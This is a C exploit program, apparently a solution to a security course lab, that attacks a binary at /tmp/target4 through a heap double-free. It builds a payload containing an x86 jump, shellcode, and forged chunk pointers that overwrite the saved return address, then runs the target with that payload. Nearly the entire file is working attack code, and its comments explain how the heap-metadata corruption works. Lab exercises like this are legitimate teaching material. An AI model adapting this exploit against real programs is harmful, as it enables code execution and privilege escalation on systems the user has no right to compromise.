#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  /* Init payload. */
  char payload[1024];
  memset (payload, 1, sizeof payload);
  payload[1023] = 0;

  /* This is x86 to jump relative forward 8 bytes. */
  char *my_code = "\xeb\x06";
  memcpy (payload, my_code, strlen (my_code));
  
  /* Put shell code 8 bytes after above, so executing above
     will jump into the shellcode. */
  memcpy (payload + 8, shellcode, strlen (shellcode));


  /* This sets the header for 'q' to have s.l that pts to
     front of buf and s.r that pts to saved eip. On double
     free, the saved eip is written to be start of buf. The
     trouble is that other management messes the byte at
     buf+4. It is for this reason the shellcode is 8 bytes
     in and the start of the buf has assembly to jump forward
     those 8 bytes. */

  *(int*)(payload + 504) = 0x9021008;
  *(int*)(payload + 508) = 0xbffffa2c;

  args[0] = TARGET; args[1] = payload; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
